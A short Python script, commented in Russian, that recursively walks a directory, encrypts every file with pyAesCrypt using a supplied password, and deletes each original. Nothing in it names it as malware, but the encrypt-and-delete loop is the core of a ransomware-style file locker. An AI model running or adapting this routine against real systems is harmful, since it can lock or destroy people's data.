import pyAesCrypt
import os


# Функция шифрования файла
def encryption(file, password):
    """
        Шифрует указанный файл с использованием заданного пароля.

        Аргументы:
        file (str): Путь к файлу, который нужно зашифровать.
        password (str): Пароль для шифрования файла.

    """
    # Задаем размер буфера
    buffer_size = 512 * 1024

    # Вызываем метод шифрования
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)

    # Выводим на консоль имя зашифрованного файла
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # Удаляем исходный файл
    os.remove(file)


# Функция сканирования директорий
def walking_by_dirs(dir, password):
    """
        Рекурсивно шифрует все файлы в указанной директории и ее поддиректориях с использованием заданного пароля.

        Аргументы:
        dir (str): Путь к директории, в которой нужно зашифровать файлы.
        password (str): Пароль для шифрования файлов.

    """
    # Перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # Если находим файл, то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # Если находим директорию, то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)
